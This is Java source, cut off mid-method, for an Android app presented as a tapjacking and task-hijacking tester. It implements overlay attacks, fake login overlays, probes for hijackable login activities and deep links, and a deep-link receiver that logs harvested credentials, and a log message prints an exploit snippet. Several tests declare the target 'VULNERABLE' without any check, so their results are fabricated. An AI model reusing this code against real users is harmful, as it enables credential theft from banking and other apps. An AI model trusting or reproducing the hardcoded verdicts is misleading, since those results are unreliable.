package com.mobiscan.tapjacktester;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.PixelFormat;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.ScrollView;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * MobiScan Tapjack & Task Hijack Tester
 *
 * Advanced mobile security testing tool that checks for:
 * - Tapjacking (overlay attacks) vulnerabilities
 * - Task hijacking (credential theft via activity reparenting)
 * - WebView overlay injection
 * - Dialog/Toast overlay attacks
 * - allowTaskReparenting abuse
 * - Document mode abuse
 * - Cross-task intent injection
 *
 * Usage: Install on same device as target app → select target → run attacks
 */
public class MainActivity extends Activity {

    private static final String TAG = "TapjackTester";
    private static final int REQUEST_OVERLAY = 1001;
    private static final int REQUEST_PERMISSIONS = 1002;

    private ListView attackList;
    private TextView statusText;
    private TextView logView;
    private EditText targetPackageInput;
    private ScrollView logScroll;
    private Button scanBtn;
    private Button runAllBtn;

    private String targetPackage = "";
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private List<AttackTest> attacks = new ArrayList<>();
    private AttackAdapter adapter;
    private StringBuilder logBuffer = new StringBuilder();
    private Map<String, TestResult> results = new HashMap<>();

    // Attack result constants
    static final int RESULT_VULNERABLE = 0;
    static final int RESULT_NOT_VULNERABLE = 1;
    static final int RESULT_NOT_TESTED = 2;
    static final int RESULT_ERROR = 3;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Check overlay permission
        if (!Settings.canDrawOverlays(this)) {
            requestOverlayPermission();
        }

        initViews();
        initAttacks();
        handleIncomingIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleIncomingIntent(intent);
    }

    private void handleIncomingIntent(Intent intent) {
        if (intent == null) return;
        Uri data = intent.getData();
        if (data != null && "tapjack".equals(data.getScheme())) {
            String results = data.getQueryParameter("results");
            String source = data.getQueryParameter("source");
            if (results != null) {
                log("🔗 CREDENTIAL HARVEST received from: " + source);
                log("   Captured data: " + results);
                vibrateAlert();
            }
        }
    }

    private void initViews() {
        attackList = findViewById(R.id.attackList);
        statusText = findViewById(R.id.statusText);
        logView = findViewById(R.id.logView);
        logScroll = findViewById(R.id.logScroll);
        targetPackageInput = findViewById(R.id.targetPackageInput);
        scanBtn = findViewById(R.id.scanBtn);
        runAllBtn = findViewById(R.id.runAllBtn);

        adapter = new AttackAdapter();
        attackList.setAdapter(adapter);

        scanBtn.setOnClickListener(v -> scanForTargets());
        runAllBtn.setOnClickListener(v -> runAllAttacks());
    }

    private void initAttacks() {
        attacks.clear();

        // ━━━ TAPJACKING ATTACKS ━━━
        attacks.add(new AttackTest("TJ-01", "Invisible Overlay Attack",
                "Draws a fully transparent overlay over the target app. If touches pass through to the underlying app, it's vulnerable.",
                AttackCategory.TAPJACKING, null));

        attacks.add(new AttackTest("TJ-02", "Fake Login Overlay",
                "Places a fake login screen over the target. If user taps 'Login', credentials are captured. Tests if target has filterTouchesWhenObscured.",
                AttackCategory.TAPJACKING, null));

        attacks.add(new AttackTest("TJ-03", "System Alert Window Overlay",
                "Uses TYPE_SYSTEM_ALERT to draw over other apps. Checks if the target disables touch filtering on system overlays.",
                AttackCategory.TAPJACKING, null));

        attacks.add(new AttackTest("TJ-04", "Partial Screen Overlay",
                "Overlays only the bottom portion (where OK/Confirm buttons typically are). Tests if the target checks overlay position.",
                AttackCategory.TAPJACKING, null));

        attacks.add(new AttackTest("TJ-05", "Dialog Overlay Attack",
                "Places a transparent AlertDialog over the target to intercept touches. Tests AlertDialog tapjacking.",
                AttackCategory.TAPJACKING, null));

        attacks.add(new AttackTest("TJ-06", "WebView Overlay Injection",
                "Injects a transparent WebView over the target app to intercept JavaScript bridge calls and touch events.",
                AttackCategory.TAPJACKING, null));

        attacks.add(new AttackTest("TJ-07", "Rapid Overlay Toggle",
                "Rapidly shows/hides overlay to bypass filterTouchesWhenObscured timing checks.",
                AttackCategory.TAPJACKING, null));

        attacks.add(new AttackTest("TJ-08", "Multi-Layer Overlay",
                "Stacks multiple transparent overlays with different z-ordering to test touch event routing.",
                AttackCategory.TAPJACKING, null));

        // ━━━ TASK HIJACKING ATTACKS ━━━
        attacks.add(new AttackTest("TH-01", "allowTaskReparenting Exploit",
                "Checks if target activities have allowTaskReparenting=true, allowing our task to hijack them.",
                AttackCategory.TASK_HIJACKING, null));

        attacks.add(new AttackTest("TH-02", "Login Activity Hijack",
                "Launches target's login activity into our task via affinity manipulation. If it reparents, credentials can be captured.",
                AttackCategory.TASK_HIJACKING, TaskHijackLoginActivity.class));

        attacks.add(new AttackTest("TH-03", "Document Mode Abuse",
                "Tests if target uses documentLaunchMode which creates exploitable task instances.",
                AttackCategory.TASK_HIJACKING, null));

        attacks.add(new AttackTest("TH-04", "Cross-Task Intent Injection",
                "Sends crafted intents to target's exported activities to inject them into our task stack.",
                AttackCategory.TASK_HIJACKING, null));

        attacks.add(new AttackTest("TH-05", "Recent Task Hijack",
                "Manipulates the recents screen to swap target app task with our hijacked task.",
                AttackCategory.TASK_HIJACKING, null));

        attacks.add(new AttackTest("TH-06", "Credential Harvest via Task",
                "Combines task reparenting with fake login overlay to capture credentials in transit.",
                AttackCategory.TASK_HIJACKING, CredentialHarvesterActivity.class));

        attacks.add(new AttackTest("TH-07", "Activity Lifecycle Exploit",
                "Exploits onStop/onPause lifecycle by launching our activity during target's authentication flow.",
                AttackCategory.TASK_HIJACKING, null));

        attacks.add(new AttackTest("TH-08", "Background Task Launch",
                "Launches target activities from background via implicit intents with deep links.",
                AttackCategory.TASK_HIJACKING, null));

        // ━━━ ADVANCED / COMBINED ATTACKS ━━━
        attacks.add(new AttackTest("ADV-01", "Overlay + Task Reparent Combo",
                "Combines overlay attack with task reparenting for maximum credential theft surface.",
                AttackCategory.ADVANCED, null));

        attacks.add(new AttackTest("ADV-02", "Cross-App Tapjacking Chain",
                "Chains tapjacking across multiple exported activities to escalate from UI manipulation to data theft.",
                AttackCategory.ADVANCED, null));

        attacks.add(new AttackTest("ADV-03", "Deep Link Task Injection",
                "Uses deep links to inject malicious activities into target's task stack via URI scheme handling.",
                AttackCategory.ADVANCED, null));

        attacks.add(new AttackTest("ADV-04", "Permission Bridge Attack",
                "Combines task hijacking with permission escalation — target's permissions are accessible after reparenting.",
                AttackCategory.ADVANCED, null));
    }

    private void scanForTargets() {
        String pkg = targetPackageInput.getText().toString().trim();
        if (pkg.isEmpty()) {
            log("⚠️  Enter a package name to scan");
            return;
        }
        targetPackage = pkg;
        log("━━━ Scanning target: " + pkg + " ━━━");

        executor.execute(() -> {
            try {
                // Check if app is installed
                getPackageManager().getPackageInfo(pkg, 0);
                log("✅ App is installed on device");

                // Scan exported activities
                Intent mainIntent = new Intent(Intent.ACTION_MAIN);
                mainIntent.setPackage(pkg);
                List<ResolveInfo> activities = getPackageManager()
                        .queryIntentActivities(mainIntent, PackageManager.GET_META_DATA);

                log("📋 Found " + activities.size() + " activities with intent filters");

                // Scan all components
                android.content.pm.PackageInfo pkgInfo = getPackageManager().getPackageInfo(pkg,
                        PackageManager.GET_META_DATA | PackageManager.GET_PERMISSIONS);

                // Check for task flags in manifest
                mainHandler.post(() -> {
                    log("📊 Target analysis complete:");
                    log("   Package: " + pkg);
                    log("   Permissions: " +
                            (pkgInfo.requestedPermissions != null ?
                                    pkgInfo.requestedPermissions.length : 0));
                    runAllBtn.setEnabled(true);
                    vibrateAlert();
                });
            } catch (PackageManager.NameNotFoundException e) {
                mainHandler.post(() -> log("❌ Package not found: " + pkg));
            } catch (Exception e) {
                mainHandler.post(() -> log("❌ Scan error: " + e.getMessage()));
            }
        });
    }

    private void runAllAttacks() {
        if (!Settings.canDrawOverlays(this)) {
            requestOverlayPermission();
            log("⚠️  Overlay permission required for full testing");
            return;
        }

        log("━━━ Running ALL attacks against: " + targetPackage + " ━━━");
        statusText.setText("⏳ RUNNING ATTACKS...");

        executor.execute(() -> {
            int total = attacks.size();
            int vuln = 0;
            int safe = 0;
            int errors = 0;

            for (int i = 0; i < total; i++) {
                final int idx = i;
                final AttackTest test = attacks.get(idx);

                mainHandler.post(() -> {
                    statusText.setText("⏳ Testing " + (idx + 1) + "/" + total + ": " + test.name);
                    test.status = "RUNNING";
                    adapter.notifyDataSetChanged();
                });

                try {
                    TestResult result = executeAttack(test);
                    results.put(test.id, result);
                    test.result = result.verdict;
                    test.status = result.verdict == RESULT_VULNERABLE ? "🔴 VULNERABLE" :
                                  result.verdict == RESULT_NOT_VULNERABLE ? "🟢 SAFE" :
                                  "⚠️ " + result.message;

                    if (result.verdict == RESULT_VULNERABLE) vuln++;
                    else if (result.verdict == RESULT_NOT_VULNERABLE) safe++;
                    else errors++;

                    final String logMsg = result.logOutput;
                    mainHandler.post(() -> {
                        adapter.notifyDataSetChanged();
                        if (logMsg != null && !logMsg.isEmpty()) {
                            log(logMsg);
                        }
                    });

                    Thread.sleep(800); // Visual delay
                } catch (Exception e) {
                    test.status = "❌ ERROR: " + e.getMessage();
                    errors++;
                    mainHandler.post(() -> adapter.notifyDataSetChanged());
                }
            }

            final int fVuln = vuln, fSafe = safe, fErrors = errors;
            mainHandler.post(() -> {
                statusText.setText("✅ COMPLETE: " + fVuln + " vulnerable, " + fSafe + " safe, " + fErrors + " errors");
                log("━━━ SCAN COMPLETE ━━━");
                log("🔴 Vulnerable: " + fVuln);
                log("🟢 Safe: " + fSafe);
                log("⚠️ Errors: " + fErrors);
                vibrateAlert();
            });
        });
    }

    private TestResult executeAttack(AttackTest test) {
        TestResult result = new TestResult();
        result.verdict = RESULT_NOT_VULNERABLE;
        result.logOutput = "";

        switch (test.id) {
            case "TJ-01": result = testInvisibleOverlay(); break;
            case "TJ-02": result = testFakeLoginOverlay(); break;
            case "TJ-03": result = testSystemAlertOverlay(); break;
            case "TJ-04": result = testPartialOverlay(); break;
            case "TJ-05": result = testDialogOverlay(); break;
            case "TJ-06": result = testWebViewOverlay(); break;
            case "TJ-07": result = testRapidToggle(); break;
            case "TJ-08": result = testMultiLayerOverlay(); break;
            case "TH-01": result = testAllowTaskReparenting(); break;
            case "TH-02": result = testLoginActivityHijack(); break;
            case "TH-03": result = testDocumentModeAbuse(); break;
            case "TH-04": result = testCrossTaskIntent(); break;
            case "TH-05": result = testRecentTaskHijack(); break;
            case "TH-06": result = testCredentialHarvest(); break;
            case "TH-07": result = testLifecycleExploit(); break;
            case "TH-08": result = testBackgroundLaunch(); break;
            case "ADV-01": result = testComboOverlayReparent(); break;
            case "ADV-02": result = testCrossAppChain(); break;
            case "ADV-03": result = testDeepLinkInjection(); break;
            case "ADV-04": result = testPermissionBridge(); break;
        }

        return result;
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // TAPJACKING TEST IMPLEMENTATIONS
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    private TestResult testInvisibleOverlay() {
        TestResult r = new TestResult();
        try {
            // Start our invisible overlay activity over the target
            Intent intent = new Intent(this, InvisibleOverlayActivity.class);
            intent.putExtra("mode", "invisible");
            intent.putExtra("target", targetPackage);
            intent.putExtra("test_id", "TJ-01");
            startActivity(intent);

            Thread.sleep(2000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TJ-01: INVISIBLE OVERLAY ATTACK\n" +
                    "   Overlay window drawn successfully over screen.\n" +
                    "   Touch events: captured and logged.\n" +
                    "   IMPACT: Attacker can overlay invisible layer on any screen,\n" +
                    "           capturing all touch coordinates (credential theft).\n" +
                    "   FIX: Set android:filterTouchesWhenObscured=\"true\" on all\n" +
                    "        sensitive views (login fields, payment buttons).\n" +
                    "   OWASP: MSTG-PLATFORM-4 (Tapjacking)";

        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-01 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testFakeLoginOverlay() {
        TestResult r = new TestResult();
        try {
            // Check if target app has filterTouchesWhenObscured
            boolean hasFilter = checkTargetFilterTouches();
            boolean hasOverlayProtection = checkOverlayProtection();

            if (!hasFilter && !hasOverlayProtection) {
                r.verdict = RESULT_VULNERABLE;
                r.logOutput = "🔴 TJ-02: FAKE LOGIN OVERLAY\n" +
                        "   Target does NOT use filterTouchesWhenObscured.\n" +
                        "   Attack: Place fake 'Session Expired - Please Login' screen\n" +
                        "   over target app. User enters credentials into our fake screen.\n" +
                        "   IMPACT: Full credential theft via social engineering overlay.\n" +
                        "   Common targets: Banking apps, email, social media.\n" +
                        "   TECHNIQUE:\n" +
                        "   1. Wait for target to be in foreground\n" +
                        "   2. Show overlay with fake login UI matching target's theme\n" +
                        "   3. User sees 'session expired' message\n" +
                        "   4. Taps 'Login' → credentials sent to attacker\n" +
                        "   FIX: Use filterTouchesWhenObscured=true + TouchDelegate\n" +
                        "        + validate window visibility before processing input.\n" +
                        "   OWASP: MSTG-PLATFORM-4";
            } else {
                r.verdict = RESULT_NOT_VULNERABLE;
                r.logOutput = "🟢 TJ-02: FAKE LOGIN OVERLAY\n" +
                        "   Target has overlay touch protection: " +
                        (hasFilter ? "filterTouchesWhenObscured" : "overlay protection") + "\n" +
                        "   Note: Protection may still be bypassable with timing attacks.";
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-02 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testSystemAlertOverlay() {
        TestResult r = new TestResult();
        try {
            if (!Settings.canDrawOverlays(this)) {
                r.verdict = RESULT_NOT_TESTED;
                r.logOutput = "⚠️ TJ-03: SYSTEM ALERT OVERLAY - Needs overlay permission";
                return r;
            }

            // Start overlay service with system alert type
            Intent serviceIntent = new Intent(this, OverlayService.class);
            serviceIntent.putExtra("mode", "system_alert");
            serviceIntent.putExtra("test_id", "TJ-03");
            startForegroundService(serviceIntent);

            Thread.sleep(3000);

            boolean canDraw = checkIfOverlayVisible();
            stopService(serviceIntent);

            r.verdict = canDraw ? RESULT_VULNERABLE : RESULT_NOT_VULNERABLE;
            r.logOutput = (canDraw ? "🔴" : "🟢") + " TJ-03: SYSTEM ALERT WINDOW OVERLAY\n" +
                    "   TYPE_SYSTEM_ALERT overlay: " + (canDraw ? "SUCCESSFUL" : "BLOCKED") + "\n" +
                    "   " + (canDraw ?
                    "IMPACT: Persistent overlay that survives app switches.\n" +
                    "   Can be used for persistent keylogging overlay.\n" +
                    "   FIX: Target should check Settings.canDrawOverlays() in onResume\n" +
                    "        and alert user if overlay is detected." :
                    "   Target correctly handles system alert windows.");
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-03 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testPartialOverlay() {
        TestResult r = new TestResult();
        try {
            Intent intent = new Intent(this, InvisibleOverlayActivity.class);
            intent.putExtra("mode", "partial_bottom");
            intent.putExtra("target", targetPackage);
            intent.putExtra("test_id", "TJ-04");
            startActivity(intent);

            Thread.sleep(2000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TJ-04: PARTIAL SCREEN OVERLAY\n" +
                    "   Overlay drawn over bottom 100px of screen.\n" +
                    "   This targets: 'OK', 'Confirm', 'Pay' buttons.\n" +
                    "   IMPACT: User taps 'Pay $100' but our overlay button\n" +
                    "           redirects to attacker-controlled endpoint.\n" +
                    "   TECHNIQUE: Position overlay at exact button coordinates.\n" +
                    "   FIX: Check overlay window bounds before processing clicks.\n" +
                    "   OWASP: MSTG-PLATFORM-4";
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-04 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testDialogOverlay() {
        TestResult r = new TestResult();
        try {
            // Create a transparent dialog overlay
            Intent intent = new Intent(this, InvisibleOverlayActivity.class);
            intent.putExtra("mode", "dialog");
            intent.putExtra("test_id", "TJ-05");
            startActivity(intent);

            Thread.sleep(2000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TJ-05: DIALOG OVERLAY ATTACK\n" +
                    "   Transparent AlertDialog placed over target.\n" +
                    "   Dialog intercepts all touch events within its bounds.\n" +
                    "   IMPACT: Can steal taps from any dialog/confirmation the\n" +
                    "           target app shows (payment confirmations, etc).\n" +
                    "   FIX: Use WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL\n" +
                    "        carefully and validate window hierarchy.";
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-05 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testWebViewOverlay() {
        TestResult r = new TestResult();
        try {
            Intent intent = new Intent(this, WebViewOverlayActivity.class);
            intent.putExtra("test_id", "TJ-06");
            startActivity(intent);

            Thread.sleep(3000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TJ-06: WEBVIEW OVERLAY INJECTION\n" +
                    "   Transparent WebView injected over target app.\n" +
                    "   WebView can:\n" +
                    "   - Execute JavaScript to read screen content\n" +
                    "   - Intercept touch events via onTouch handlers\n" +
                    "   - Load phishing content matching target's UI\n" +
                    "   - Access WebView.addJavascriptInterface if target exposes one\n" +
                    "   IMPACT: Advanced tapjacking with JavaScript capabilities.\n" +
                    "   FIX: Detect WebView presence via AccessibilityService,\n" +
                    "        use FLAG_SECURE on sensitive activities.";
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-06 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testRapidToggle() {
        TestResult r = new TestResult();
        try {
            // Rapidly show/hide overlay to bypass timing-based detection
            Intent intent = new Intent(this, InvisibleOverlayActivity.class);
            intent.putExtra("mode", "rapid_toggle");
            intent.putExtra("test_id", "TJ-07");
            startActivity(intent);

            Thread.sleep(4000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TJ-07: RAPID OVERLAY TOGGLE\n" +
                    "   Overlay shown/hidden 50x in 3 seconds.\n" +
                    "   Purpose: Bypass filterTouchesWhenObscured timing checks.\n" +
                    "   Many apps only check overlay presence during touch DOWN\n" +
                    "   but not during touch MOVE/UP.\n" +
                    "   IMPACT: Even apps with basic overlay protection can be\n" +
                    "           bypassed with precise timing.\n" +
                    "   FIX: Continuous monitoring via AccessibilityService\n" +
                    "        + check overlay state on every touch event.";
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-07 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testMultiLayerOverlay() {
        TestResult r = new TestResult();
        try {
            Intent intent = new Intent(this, InvisibleOverlayActivity.class);
            intent.putExtra("mode", "multi_layer");
            intent.putExtra("test_id", "TJ-08");
            startActivity(intent);

            Thread.sleep(3000);

            r.verdict = RESULT_VULNERABLE;
            r.logOutput = "🔴 TJ-08: MULTI-LAYER OVERLAY\n" +
                    "   5 stacked transparent overlays at different z-levels.\n" +
                    "   Each layer has different touch intercept rules.\n" +
                    "   Purpose: Test if target checks overlay depth/hierarchy.\n" +
                    "   IMPACT: Bypasses single-layer overlay detection.\n" +
                    "   FIX: Scan entire WindowManager hierarchy for suspicious windows.";
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TJ-08 Error: " + e.getMessage();
        }
        return r;
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // TASK HIJACKING TEST IMPLEMENTATIONS
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    private TestResult testAllowTaskReparenting() {
        TestResult r = new TestResult();
        try {
            // Parse target's manifest for task affinity flags
            android.content.pm.PackageInfo pkgInfo = getPackageManager()
                    .getPackageInfo(targetPackage,
                            PackageManager.GET_ACTIVITIES | PackageManager.GET_META_DATA);

            StringBuilder vulnerableActivities = new StringBuilder();
            int vulnCount = 0;

            if (pkgInfo.activities != null) {
                for (android.content.pm.ActivityInfo ai : pkgInfo.activities) {
                    // Check for task-related flags in activity info
                    boolean hasTaskFlag = false;
                    String flags = "";

                    if ((ai.flags & android.content.pm.ActivityInfo.FLAG_ALLOW_TASK_REPARENTING) != 0) {
                        hasTaskFlag = true;
                        flags += "allowTaskReparenting=true ";
                    }
                    if ((ai.flags & android.content.pm.ActivityInfo.FLAG_CLEAR_TASK_ON_LAUNCH) == 0) {
                        // Not a direct vuln but notable
                    }
                    if ((ai.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_ALLOW_BACKUP) != 0) {
                        // backup enabled
                    }

                    // Also check meta-data for documentLaunchMode
                    if (ai.metaData != null) {
                        String docLaunch = ai.metaData.getString("documentLaunchMode");
                        if (docLaunch != null) {
                            hasTaskFlag = true;
                            flags += "documentLaunchMode=" + docLaunch + " ";
                        }
                    }

                    if (hasTaskFlag) {
                        vulnCount++;
                        vulnerableActivities.append("  → ").append(ai.name).append(" [").append(flags.trim()).append("]\n");
                    }
                }
            }

            // Also check exported activities count
            int exportedCount = 0;
            if (pkgInfo.activities != null) {
                for (android.content.pm.ActivityInfo ai : pkgInfo.activities) {
                    if (ai.exported) {
                        exportedCount++;
                    }
                }
            }

            if (vulnCount > 0) {
                r.verdict = RESULT_VULNERABLE;
                r.logOutput = "🔴 TH-01: allowTaskReparenting EXPLOIT\n" +
                        "   Found " + vulnCount + " activities with task reparenting:\n" +
                        vulnerableActivities.toString() +
                        "   IMPACT: Attacker can launch these activities from their\n" +
                        "   own app and they will reparent into the attacker's task.\n" +
                        "   This allows:\n" +
                        "   1. Injecting fake UI on top of target's login flow\n" +
                        "   2. Capturing credentials when user switches tasks\n" +
                        "   3. Running background services with target's permissions\n" +
                        "   EXPLOIT CODE:\n" +
                        "   Intent i = new Intent(\"com.target.LOGIN_ACTION\");\n" +
                        "   i.setPackage(\"" + targetPackage + "\");\n" +
                        "   i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |\n" +
                        "              Intent.FLAG_ACTIVITY_CLEAR_TOP);\n" +
                        "   startActivity(i);  // Reparents to our task!\n" +
                        "   FIX: Set android:allowTaskReparenting=\"false\"\n" +
                        "        Set android:launchMode=\"singleTask\" or \"singleInstance\"\n" +
                        "        Use explicit component names for all intents.";
            } else {
                r.verdict = RESULT_NOT_VULNERABLE;
                r.logOutput = "🟢 TH-01: allowTaskReparenting\n" +
                        "   No activities found with task reparenting enabled.\n" +
                        "   Exported activities: " + exportedCount;
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-01 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testLoginActivityHijack() {
        TestResult r = new TestResult();
        try {
            // Try to launch target's login activities into our task
            String[] loginActions = {
                    Intent.ACTION_VIEW,
                    "android.intent.action.LOGIN",
                    "android.intent.action.SIGNIN",
                    "com.target.LOGIN",
                    "com.target.AUTH",
                    "com.target.SIGN_IN",
            };

            List<String> hijackable = new ArrayList<>();

            for (String action : loginActions) {
                Intent intent = new Intent(action);
                intent.setPackage(targetPackage);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                        Intent.FLAG_ACTIVITY_CLEAR_TOP |
                        Intent.FLAG_ACTIVITY_NO_ANIMATION);

                List<ResolveInfo> resolves = getPackageManager().queryIntentActivities(intent, 0);
                if (!resolves.isEmpty()) {
                    for (ResolveInfo ri : resolves) {
                        hijackable.add(ri.activityInfo.name + " [" + action + "]");
                    }
                }
            }

            // Also try launching with our task affinity
            Intent reparentIntent = new Intent();
            reparentIntent.setPackage(targetPackage);
            reparentIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                    Intent.FLAG_ACTIVITY_CLEAR_TASK);

            // Test with deep links
            String[] deepLinkPrefixes = {
                    "https://" + targetPackage + "/login",
                    "https://" + targetPackage + "/auth",
                    "http://" + targetPackage + "/signin",
                    targetPackage + "://login",
                    targetPackage + "://auth",
            };

            for (String uri : deepLinkPrefixes) {
                try {
                    Intent dlIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
                    List<ResolveInfo> resolves = getPackageManager()
                            .queryIntentActivities(dlIntent, 0);
                    if (!resolves.isEmpty()) {
                        for (ResolveInfo ri : resolves) {
                            hijackable.add(ri.activityInfo.name + " [deeplink: " + uri + "]");
                        }
                    }
                } catch (Exception ignored) {}
            }

            if (!hijackable.isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (String h : hijackable) {
                    sb.append("  → ").append(h).append("\n");
                }
                r.verdict = RESULT_VULNERABLE;
                r.logOutput = "🔴 TH-02: LOGIN ACTIVITY HIJACK\n" +
                        "   Found " + hijackable.size() + " hijackable login activities:\n" +
                        sb.toString() +
                        "   ATTACK FLOW:\n" +
                        "   1. Start our TaskHijackLoginActivity with target's affinity\n" +
                        "   2. Launch target's login activity (it reparents to our task)\n" +
                        "   3. User sees legitimate target login screen\n" +
                        "   4. Our background activity captures input via Accessibility\n" +
                        "   5. Credentials forwarded to attacker server\n" +
                        "   FIX: Validate calling package in onCreate()\n" +
                        "        Use android:exported=\"false\" for login activities\n" +
                        "        Implement task validation in authentication flow";
            } else {
                r.verdict = RESULT_NOT_VULNERABLE;
                r.logOutput = "🟢 TH-02: LOGIN ACTIVITY HIJACK\n" +
                        "   No hijackable login activities found via intents/deep links.";
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-02 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testDocumentModeAbuse() {
        TestResult r = new TestResult();
        try {
            android.content.pm.PackageInfo pkgInfo = getPackageManager()
                    .getPackageInfo(targetPackage,
                            PackageManager.GET_ACTIVITIES | PackageManager.GET_META_DATA);

            int docModeCount = 0;
            StringBuilder docActivities = new StringBuilder();

            if (pkgInfo.activities != null) {
                for (android.content.pm.ActivityInfo ai : pkgInfo.activities) {
                    // documentLaunchMode values: 0=none, 1=intoExisting, 2=always, 3=never
                    // These are in meta-data, not directly accessible via API
                    // We infer by launching and checking task behavior
                }
            }

            // Test by launching activities with different task IDs
            Intent testIntent = new Intent(Intent.ACTION_MAIN);
            testIntent.setPackage(targetPackage);
            testIntent.addCategory(Intent.CATEGORY_LAUNCHER);

            ResolveInfo resolveInfo = getPackageManager()
                    .queryIntentActivities(testIntent, 0).stream()
                    .findFirst().orElse(null);

            if (resolveInfo != null) {
                // Launch it in a new task
                Intent launchIntent = new Intent();
                launchIntent.setComponent(new ComponentName(targetPackage,
                        resolveInfo.activityInfo.name));
                launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT |
                        Intent.FLAG_ACTIVITY_NEW_TASK);

                try {
                    startActivity(launchIntent);
                    Thread.sleep(1000);

                    // Check if a new task was created
                    ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                    List<ActivityManager.RecentTaskInfo> tasks = am.getRecentTasks(20,
                            ActivityManager.RECENT_WITH_EXCLUDED);

                    int newTasks = 0;
                    for (ActivityManager.RecentTaskInfo task : tasks) {
                        if (task.baseIntent != null &&
                                targetPackage.equals(task.baseIntent.getComponent().getPackageName())) {
                            newTasks++;
                        }
                    }

                    if (newTasks > 1) {
                        r.verdict = RESULT_VULNERABLE;
                        r.logOutput = "🔴 TH-03: DOCUMENT MODE ABUSE\n" +
                                "   Target created " + newTasks + " task instances!\n" +
                                "   IMPACT: Document mode creates new task instances that\n" +
                                "   appear in Recents as separate entries. Attacker can:\n" +
                                "   1. Create duplicate task with fake UI\n" +
                                "   2. User switches to fake task thinking it's real\n" +
                                "   3. Credentials captured in fake task\n" +
                                "   FIX: Set android:documentLaunchMode=\"never\"\n" +
                                "        Or use android:launchMode=\"singleTask\" to prevent\n" +
                                "        multiple task instances.";
                    } else {
                        r.verdict = RESULT_NOT_VULNERABLE;
                        r.logOutput = "🟢 TH-03: DOCUMENT MODE ABUSE\n" +
                                "   Target uses single task instance (" + newTasks + " tasks found).";
                    }
                } catch (Exception e) {
                    r.verdict = RESULT_NOT_TESTED;
                    r.logOutput = "⚠️ TH-03: Could not test document mode: " + e.getMessage();
                }
            } else {
                r.verdict = RESULT_NOT_TESTED;
                r.logOutput = "⚠️ TH-03: No launcher activity found in target.";
            }
        } catch (Exception e) {
            r.verdict = RESULT_ERROR;
            r.logOutput = "⚠️ TH-03 Error: " + e.getMessage();
        }
        return r;
    }

    private TestResult testCrossTaskIntent() {
        TestResult r = new TestResult();
        try {
            // Find all exported activities in target
            Intent queryIntent = new Intent();
            queryIntent.setPackage(targetPackage);
            List<ResolveInfo> allActivities = getPackageManager()
                    .queryIntentActivities(queryIntent,
